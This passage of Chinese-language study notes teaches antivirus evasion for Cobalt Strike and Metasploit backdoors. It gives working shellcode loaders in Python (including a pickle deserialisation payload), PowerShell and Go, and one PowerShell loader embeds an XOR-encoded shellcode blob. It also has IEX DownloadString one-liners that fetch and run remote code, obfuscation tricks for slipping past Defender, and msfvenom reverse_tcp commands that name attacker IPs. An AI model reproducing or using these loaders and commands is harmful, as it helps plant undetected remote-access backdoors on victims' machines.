  ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))

if __name__ == '__main__':
   shellcode = b'.....................'
   shellcode = decrypt(shellcode).encode()
   shellcode = base64.b64decode(shellcode)
   shellcode = bytearray(shellcode)
   run(shellcode)
```

补充注意：python 中 encode() 是把字符串转化为字节（b'.....'），decode() 是把字节转成字符串

### 反序列化

> 关于phthon反序列化相关就不详细展开了，可以看一下下面这篇文章
>
> https://misakikata.github.io/2020/04/python-反序列化/

python 序列化和反序列化使用最为频繁的是`cPickle`和`pickle`，前者是C语言实现，据说速度比后者快很多。

只不过python3标准库中不再叫`cPickle`，而是只有`pickle`。python2中两者都有。

`pickle`有如下四种操作方法:

<img src=".\图片\attach-9ba7893d3ab7464eaaa89dd0ce86370c88d5ef89.png" alt="image-20220528181143183.png" style="zoom:80%;" />

与`PHP`中的`__wakeup`类似，`Python`中的`__reduce__`方法在对象被反序列化的时候执行。

测试版本，生成 反序列化对象，exec() 函数是执行python代码：

```python
import pickle
import base64

shellcodeloader = """
import ctypes,base64,time

#这里不能直接存在空字节，反序列化的时候会出错，所以要处理一下
shellcode = base64.b64decode(b'/EiD5PDoyAAAAE....')
shellcode = codecs.escape_decode(shellcode)[0]
shellcode = bytearray(shellcode)

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),  
    ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000),  
    ctypes.c_int(0x40) 
    )

buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buffered,
    ctypes.c_int(len(shellcode))
)

handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0), 
    ctypes.c_uint64(ptr), 
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.pointer(ctypes.c_int(0)) 
)

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
"""

class AAA(object):
    def __reduce__(self):
        return (exec, (shellcodeloader,))

seri = pickle.dumps(AAA())
seri_base64 = base64.b64encode(seri)
print(seri_base64)
```

发布版本，放入之前生成的bytes对象，运行上线；

```python
import base64,pickle

shellcodeloader = b'gASVwgcAAAAAAACMCGJ1aWx0aW5zlIwEZX............'
pickle.loads(base64.b64decode(shellcodeloader))
```

## python打包成exe

[奇安信攻防社区-python进行shellcode免杀 (butian.net)](https://forum.butian.net/index.php/share/1690)

1、pyinstaller

2、py2exe

3、Nuitka

```
--standalone：方便移植到其他机器，不用再安装python
--show-memory --show-progress：展示整个安装的进度过程
--nofollow-imports：不编译代码中所有的import
--follow-import-to=utils,src：需要编译成C++代码的指定的2个包含源码的文件夹，这里用,来进行分隔。
--output-dir=out：指定输出的结果路径为out。
--windows-disable-console：运行exe取消弹框。
--mingw64 #默认为已经安装的vs2017去编译，否则就按指定的比如mingw(官方建议)
--standalone 独立环境，这是必须的(否则拷给别人无法使用)
--windows-disable-console 没有CMD控制窗口
--output-dir=out 生成exe到out文件夹下面去
--show-progress 显示编译的进度，很直观
--show-memory 显示内存的占用
--include-qt-plugins=sensible,styles 打包后PyQt的样式就不会变了
--plugin-enable=qt-plugins 需要加载的PyQt插件
--plugin-enable=tk-inter 打包tkinter模块的刚需
--plugin-enable=numpy 打包numpy,pandas,matplotlib模块的刚需
--plugin-enable=torch 打包pytorch的刚需
--plugin-enable=tensorflow 打包tensorflow的刚需
--windows-icon-from-ico=你的.ico 软件的图标
--windows-company-name=Windows下软件公司信息
--windows-product-name=Windows下软件名称
--windows-file-version=Windows下软件的信息
--windows-product-version=Windows下软件的产品信息
--windows-file-description=Windows下软件的作用描述
--windows-uac-admin=Windows下用户可以使用管理员权限来安装
--linux-onefile-icon=Linux下的图标位置
--onefile 像pyinstaller一样打包成单个exe文件
--include-package=复制比如numpy,PyQt5 这些带文件夹的叫包或者轮子
--include-module=复制比如when.py 这些以.py结尾的叫模块
使用：nuitka --mingw64 --standalone --show-memory --show-progress --nofollow-imports --follow-import-to=utils,src --output-dir=out 108.py
```



# DAY3

PowerShell 免杀

## 原型上线

```powershell
Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

	return $var_type_builder.CreateType()
}

[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSByckvxJyMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMSVJWRlFaDhANEA0SDVBPSk4NTkpNDUlQI/nrWCjGJ6EYxFJxTIoXLBcSj6dUIoQdCHmF2xrI2IcVOhFwiLWhDG2IgFyWwQ20hkHCrK50I2JAQEZTVxkDV0ZbVwxLV05PD0JTU09KQEJXSkxNDFtLV05PCFtOTw9CU1NPSkBCV0pMTQxbTk8YUh4TDRoPCQwJGFIeEw0bLiliQEBGU1cOb0JNRFZCREYZA0ZNDnZwD0ZNGFIeEw0WLilxRkVGUUZRGQNLV1dTGQwMQExHRg1JUlZGUVoNQExODC4pYkBARlNXDmZNQExHSk1EGQNEWUpTDwNHRkVPQldGLil2UEZRDmJERk1XGQNuTFlKT09CDBYNEwMLdEpNR0xUUANtdwMVDRAYA3dRSkdGTVcMFA0TGANRVRkSEg0TCgNPSkhGA2RGQEhMLikjxsGXPmm++ogJTR2DFYXtdbz4dLiGViQdROt70p+hp75AByzzJBE4CVdgaJKAeBDetto+uIb8aCNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmowsIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcFxANEhcRDREWFg0SEBEjIyKlgw==')

for ($x = 0; $x -lt $var_code.Count; $x++) {
	$var_code[$x] = $var_code[$x] -bxor 35
}

$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
$var_runme.Invoke([IntPtr]::Zero)
'@

If ([IntPtr]::size -eq 8) {
	start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
}
else {
	IEX $DoIt
}
```

上线

```bash
PS C:\Users\zfy\Desktop> .\payload.ps1
```

## 手功混淆

### base64编码变量$DoIt

由与原型代码中特殊变量 $DoIt 里的值为上线代码，就先试用简单的base64编码进行混淆

<img src=".\图片\Snipaste_2023-04-29_20-17-00.png" alt="Snipaste_2023-04-29_20-17-00" style="zoom: 67%;" />

代码如下：

```bash
Set-StrictMode -Version 2

$bb=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("............."))

If ([IntPtr]::size -eq 8) {
	start-job { param($a) IEX $a } -RunAs32 -Argument $bb | wait-job | Receive-Job
}
else {
	IEX $bb
}
```

上线

```bash
PS C:\Users\zfy\Desktop> .\payload.ps1
```

### 进阶混淆

可以在关键变量 $DoIt 里 base64 编码前和编码后**添加杂乱代码**，然后进行解码和替换还原，这也是一种思路

## 项目混淆（已失效）

https://github.com/danielbohannon/Invoke-Obfuscation

```
加载模块：Import-Module ./Invoke-Obfuscation.psd1
运行程序：Invoke-Obfuscation
处理文件：set scriptpath C:\Users\86135\Desktop\1.ps1
处理代码：set scriptblock 'xxxx'
进入编码：encoding
选择编码：1-8
输出文件：out C:\Users\86135\Desktop\11.ps1
```

## 文件分离

分离免杀，**远程加载**原型里的可疑代码

```powershell
Set-StrictMode -Version 2

$d= ((New-Object System.Net.Webclient).DownloadString('http://127.0.0.1:8081/test01.txt'))
$x=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($d))


If ([IntPtr]::size -eq 8) {
	start-job { param($a) IEX $a } -RunAs32 -Argument $x | wait-job | Receive-Job
}
else {
	IEX $x
}
```

`http://127.0.0.1:8081/test01.txt` 里是之前base64编码过的特殊变量$DoIt的值

<img src=".\图片\Snipaste_2023-04-29_20-29-30.png" alt="Snipaste_2023-04-29_20-29-30" style="zoom:80%;" />

上线

```bash
PS C:\Users\zfy\Desktop> .\payload.ps1
```

其思路配合编码加密混淆关键变量 $DoIt 的值使用会更好

## 特征修改过DF

Fuzz DF查杀特征

```
1、Shellcode 换格式
2、变量名&函数名全修改
```



### 第一步

首先使用脚本 `base64tobyte.ps1`  对$DoIt变量里的关键 shellcode 进行 `base64tobyte`：

```powershell
[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSByckvxJyMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMSVJWRlFaDhANEA0SDVBPSk4NTkpNDUlQI+bzJJqpphKZzEAGHjMwcibl4QoOYQoRljfE5UXmy9J39XC5xBOPdiqUR1nJ5SeVSQ6aCXVYI2JAQEZTVxkDV0ZbVwxLV05PD0JTU09KQEJXSkxNDFtLV05PCFtOTw9CU1NPSkBCV0pMTQxbTk8YUh4TDRoPCQwJGFIeEw0bLiliQEBGU1cOb0JNRFZCREYZA0ZNDnZwD0ZNGFIeEw0WLilxRkVGUUZRGQNLV1dTGQwMQExHRg1JUlZGUVoNQExODC4pYkBARlNXDmZNQExHSk1EGQNEWUpTDwNHRkVPQldGLil2UEZRDmJERk1XGQNuTFlKT09CDBYNEwMLdEpNR0xUUANtdwMVDRAYA3dRSkdGTVcMFA0TGANRVRkSEg0TCgNPSkhGA2RGQEhMLikj9L3HIKmL2iR95/IXPdsrVzYZPlXfCMMNGYLoyZxB0g27UzkyEfIsNBLMxa8wP41s0bLuVZJ6ySNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmowsIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcFxANEhcRDREWFg0SEBEjIyKlgw==')
```

`base64tobyte.ps1`为：

```powershell
Write-Host $logo
$payload = read-host "CS payload"
$string = ''
$s = [Byte[]]$var_code = [System.Convert]::FromBase64String($payload)
$s|foreach { $string = $string + $_.ToString()+','}
Write-Host ''
write-host 'bytes:'$string.Substring(0,$string.Length-1)
$string.Substring(0,$string.Length-1) |Out-File result.txt
Write-Host "Write to result.txt finished! "
```

使用生成 byte ：

<img src=".\图片\Snipaste_2023-04-29_20-43-04.png" alt="Snipaste_2023-04-29_20-43-04" style="zoom:67%;" />

### 第二步

替换原型里的函数名变量以及 $var_code 的格式，替换一切可能有指纹的地方，最终为如下代码：

```powershell
Set-StrictMode -Version 2

$fuck = @'
function func_g {
	Param ($var_module, $var_procedure)		
	$var_uuu = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_uuu.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_uuu.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_gg {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_ppp,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_tb = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_tb.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_ppp).SetImplementationFlags('Runtime, Managed')
	$var_tb.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_ppp).SetImplementationFlags('Runtime, Managed')

	return $var_tb.CreateType()
}

[Byte[]]$acd = [Byte[]](223,203,170,35,35,35,67,170,198,18,241,71,168,113,19,168,113,47,168,113,55,168,81,11,44,148,105,5,18,220,18,227,143,31,66,95,33,15,3,226,236,46,34,228,193,211,113,116,168,113,51,168,97,31,34,243,168,99,91,166,227,87,105,34,243,115,168,107,59,168,123,3,34,240,192,31,106,168,23,168,34,245,18,220,18,227,143,226,236,46,34,228,27,195,86,215,32,94,219,24,94,7,86,193,123,168,123,7,34,240,69,168,47,104,168,123,63,34,240,168,39,168,34,243,170,103,7,7,120,120,66,122,121,114,220,195,123,124,121,168,49,200,165,126,75,77,70,87,35,75,84,74,77,74,119,75,111,84,5,36,220,246,18,220,116,116,116,116,116,75,25,117,90,132,220,246,202,167,35,35,35,120,18,234,114,114,73,32,114,114,75,241,39,35,35,112,115,75,116,170,188,229,220,246,200,83,120,18,241,113,75,35,33,99,167,113,113,113,112,113,115,75,200,118,13,24,220,246,170,229,160,224,115,18,220,116,116,73,220,112,117,75,14,37,59,88,220,246,166,227,44,167,224,34,35,35,18,220,166,213,87,39,170,218,200,42,75,137,230,193,126,220,246,170,226,75,102,2,125,18,220,246,18,220,116,73,36,114,117,115,75,148,116,195,40,220,246,156,35,12,35,35,26,228,87,148,18,220,202,178,34,35,35,202,234,34,35,35,203,168,220,220,220,12,73,82,86,70,81,90,14,16,13,16,13,18,13,80,79,74,78,13,78,74,77,13,73,80,35,230,243,36,154,169,166,18,153,204,64,6,30,51,48,114,38,229,225,10,14,97,10,17,150,55,196,229,69,230,203,210,119,245,112,185,196,19,143,118,42,148,71,89,201,229,39,149,73,14,154,9,117,88,35,98,64,64,70,83,87,25,3,87,70,91,87,12,75,87,78,79,15,66,83,83,79,74,64,66,87,74,76,77,12,91,75,87,78,79,8,91,78,79,15,66,83,83,79,74,64,66,87,74,76,77,12,91,78,79,24,82,30,19,13,26,15,9,12,9,24,82,30,19,13,27,46,41,98,64,64,70,83,87,14,111,66,77,68,86,66,68,70,25,3,70,77,14,118,112,15,70,77,24,82,30,19,13,22,46,41,113,70,69,70,81,70,81,25,3,75,87,87,83,25,12,12,64,76,71,70,13,73,82,86,70,81,90,13,64,76,78,12,46,41,98,64,64,70,83,87,14,102,77,64,76,71,74,77,68,25,3,68,89,74,83,15,3,71,70,69,79,66,87,70,46,41,118,80,70,81,14,98,68,70,77,87,25,3,110,76,89,74,79,79,66,12,22,13,19,3,11,116,74,77,71,76,84,80,3,109,119,3,21,13,16,24,3,119,81,74,71,70,77,87,12,20,13,19,24,3,81,85,25,18,18,13,19,10,3,79,74,72,70,3,100,70,64,72,76,46,41,35,244,189,199,32,169,139,218,36,125,231,242,23,61,219,43,87,54,25,62,85,223,8,195,13,25,130,232,201,156,65,210,13,187,83,57,50,17,242,44,52,18,204,197,175,48,63,141,108,209,178,238,85,146,122,201,35,75,211,150,129,117,220,246,73,99,75,35,51,35,35,75,35,35,99,35,116,75,123,135,112,198,220,246,176,154,140,44,35,35,34,250,114,112,170,196,116,75,35,3,35,35,112,117,75,49,181,170,193,220,246,166,227,87,229,168,36,34,224,166,227,86,198,123,224,203,138,222,220,220,23,16,13,18,23,17,13,17,22,22,13,18,16,17,35,35,34,165,131)

for ($xiaodi = 0; $xiaodi -lt $acd.Count; $xiaodi++) {
	$acd[$xiaodi] = $acd[$xiaodi] -bxor 35
}

$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_g kernel32.dll VirtualAlloc), (func_gg @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$var_bf = $var_va.Invoke([IntPtr]::Zero, $acd.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($acd, 0, $var_bf, $acd.length)

$var_rm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_bf, (func_gg @([IntPtr]) ([Void])))
$var_rm.Invoke([IntPtr]::Zero)
'@

If ([IntPtr]::size -eq 8) {
	start-job { param($a) IE`X $a } -RunAs32 -Argument $fuck | wait-job | Receive-Job
}
else {
	I`EX $fuck
}
```

运行即上线

## 命令模式

### cs原型

```bash
powershell -nop -w hidden -encodedcommand ............................
```

此时运行命令，安全软件会拦截，此时拦截是动态拦截，**拦截的是行为**

### 远程执行ps1

运行便上线

```bash
powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://127.0.0.1:8081/x.ps1'))"
```

`http://127.0.0.1:8081/x.ps1` 里是之前的powershell**文件分离型后门**：

```powershell
Set-StrictMode -Version 2

$d= ((New-Object System.Net.Webclient).DownloadString('http://127.0.0.1:8081/test01.txt'))
$x=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($d))


If ([IntPtr]::size -eq 8) {
	start-job { param($a) IEX $a } -RunAs32 -Argument $x | wait-job | Receive-Job
}
else {
	IEX $x
}
```

### 替换关键字/文件名

#### 1.1

分离出两个变量再拼接：

```bash
powershell "$a='IEX((New-Object Net.WebClient).DownloadString(''ht';$b='tp://127.0.0.1:8081/x.ps1''));';IEX ($a+$b)"
```

#### 1.2

这个更好用，把powershell.exe 复制出来重命名，用 exe执行

```bash
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe bypass.exe
```

```bash
bypass.exe "$a='IEX((New-Object Net.WebClient).DownloadString(''ht';$b='tp://127.0.0.1:8081/x.ps1''));';IEX ($a+$b)"
```

### 垃圾数据干扰

```bash
powershell -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal set-alias -name key -value IEX; key(New-Object Net.WebClient).DownloadString('ht'+'tp://127.0.0.1:8081/x.ps1')
```

### Ladon混淆命令

<img src=".\图片\Snipaste_2023-04-29_21-47-23.png" alt="Snipaste_2023-04-29_21-47-23" style="zoom:80%;" />

## powershell打包成exe

使用一些工具把 powershell 打包成 exe 

举例

1、Ladon

2、Win-PS2EXE

<img src=".\图片\Snipaste_2023-04-29_21-49-56.png" alt="Snipaste_2023-04-29_21-49-56" style="zoom:67%;" />

工具越稀有越偏门，效果可能越好

# Day4

## C#

```
1、原型
msfvenom -p windows/meterpreter/reverse_tcp LHOST=47.94.236.117 LPORT=6688 -e x86/shikata_ga_nai -i 15 -f csharp
2、混淆
msfvenom -p windows/meterpreter/reverse_tcp LHOST=47.94.236.117 LPORT=6688 -f csharp
3、文件混淆-反调试VT
开源-ConfuserEx
付费-VirboxProtector
```

使用反调试可以让对方无法反编译获得正常的源码，以免获取关键信息

反虚拟化，就是不让该 exe 文件在虚拟环境中运行。360查杀的部分原理就是让exe文件在虚拟环境中运行，查看它的行为

总之，对exe文件加壳可能降低后门文件的查杀率

## GO

```
-运行1.go脚本
go run 1.go
-编译1.go脚本
go build 1.go
-没有弹窗的exe命令编译：
go build -ldflags="-H windowsgui -w -s" 1.go
```

### 1、原型

```go
package main

import (
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
	shellcode_buf = []byte{   
        ................................,
	}
)

func checkErr(err error) {
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}

func main() {
	shellcode := shellcode_buf
	if len(os.Args) > 1 {
		shellcodeFileData, err := ioutil.ReadFile(os.Args[1])
		checkErr(err)
		shellcode = shellcodeFileData
	}

	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	checkErr(err)
	syscall.Syscall(addr, 0, 0, 0, 0)
}
```

直接上线：

```bash
go run 1.go
```

打包成 exe 运行上线

```bash
go build -ldflags="-H windowsgui -w -s" 1.go
# 生成 1.exe后直接执行
1.exe
```

### 2、编码混淆

原理还是对shellcode进行加密解密的，老生常谈

测试版脚本加密，发布版脚本解密，同时运用了**分离思想**，把密匙和shellcode解密后分离出来，以入参的方式执行发布版本

这里使用的是AES加密



测试脚本 `3.go` ：

```go
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"math/rand"
	"os"
	"strings"
	"time"
)

//随机生成key,后面用来解密的
func key(l int) string {
	str := "0123456789abcdefghijklmnopqrstuvwxyz"
	bytes := []byte(str)
	result := []byte{}
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i := 0; i < l; i++ {
		result = append(result, bytes[r.Intn(len(bytes))])
	}
	return string(result)
}

//使用PKCS5进行填充用来
func PKCS5Padding(ciphertext []byte, blockSize int) []byte {
	padding := blockSize - len(ciphertext)%blockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

//进行aes加密
func AesEncrypt(origData, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	blockSize := block.BlockSize()
	origData = PKCS5Padding(origData, blockSize)
	blockMode := cipher.NewCBCEncrypter(block, key[:blockSize])
	crypted := make([]byte, len(origData))
	blockMode.CryptBlocks(crypted, origData)
	return crypted, nil
}

//主函数入口,对字符进行了处理
func main() {
	argsWithProg := os.Args
	if len(argsWithProg) < 2 {
		fmt.Println("usage : ", argsWithProg[0], " paylaod.c")
		return
	}
	confFile := os.Args[1]
	str2 := strings.Replace(confFile, "\\x", "", -1)
	data, _ := hex.DecodeString(str2)
	key1 := key(16)
	fmt.Println("Key:", key1)
	var key []byte = []byte(key1)
	aes, _ := AesEncrypt(data, key)
	encoded := base64.StdEncoding.EncodeToString(aes)
	fmt.Println("Code:", encoded)
}
```

<img src=".\图片\Snipaste_2023-04-30_15-41-09.png" alt="Snipaste_2023-04-30_15-41-09" style="zoom:80%;" />

发布版本 3.1.go：

```go
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"os"
	"syscall"
	"unsafe"
)

//这一块是定义一些东西去加载我们的shellcode
var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

//shellcode执行函数
func Run(sc []byte) {
	f := func() {}
	var oldfperms uint32
	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
		panic("Call to VirtualProtect failed!")
	}
	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))
	var oldshellcodeperms uint32
	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
		panic("Call to VirtualProtect failed!")
	}
	f()
}

//同样为了保证我们的shellcode正常运行要进行PKCS5的操作
func PKCS5UnPadding(origData []byte) []byte {
	length := len(origData)
	unpadding := int(origData[length-1])
	return origData[:(length - unpadding)]
}

//经典的aes解密操作
func AesDecrypt(crypted, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	blockSize := block.BlockSize()
	blockMode := cipher.NewCBCDecrypter(block, key[:blockSize])
	origData := make([]byte, len(crypted))
	blockMode.CryptBlocks(origData, crypted)
	origData = PKCS5UnPadding(origData)
	return origData, nil
}

//运行主函数,主要是接受参数进行base64解码,ase解码,运行shellcode
func main() {
	key1 := os.Args[1]
	payload1 := os.Args[2]
	encoded2, _ := base64.StdEncoding.DecodeString(payload1)
	var key []byte = []byte(key1)
	AES, _ := AesDecrypt(encoded2, key)
	Run(AES)
}
```

以入参的方式运行：

<img src=".\图片\Snipaste_2023-04-30_15-42-42.png" alt="Snipaste_2023-04-30_15-42-42" style="zoom:67%;" />

### 3、分离参数

cs或msf生成raw格式

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=43.142.255.132 LPORT=6688 -f hex
```

查看go示范代码：

```go
package main

import (
	"encoding/hex"
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect") //syscall是调用函数 通过call NewLazyDLL来调取kernel32.dll（及其重要的链接库 几乎所有的木马都会调用这个函数）NewProc是指api NewProc("VirtualProtect")就是获取VirtualProtect这个函数的api
//保护内存函数 去掉特征
func VirtualProtect(a unsafe.Pointer, b uintptr, c uint32, d unsafe.Pointer) { //转换为同一类型的地址  uintptr，uint32
	t, _, _ := procVirtualProtect.Call(
		uintptr(a),
		uintptr(b),
		uintptr(c),
		uintptr(d))
	fmt.Print(t)
}
func Run(sc []byte) {
	//定义函数
	f := func() {}
	var old uint32
	//一级指针的值为f的地址
	//unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))) 将&f转换为1级指针的地址 unsafe.Sizeof(uinpter(0))保护的参数为0 unint32(0x40)flNewProtect，内存新的属性类型，设置为PAGE_EXECUTE_READWRITE（0x40）时该内存页为可读可写可执行
	VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&old))
	//将shellcode 放入函数中  &sc为shellcode的地址 **(**uintptr)(unsafe.Pointer(&f))就是将shellcode的地址赋值给了&f的地址
	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))
	var orgshellcode uint32
	//shellcode地址
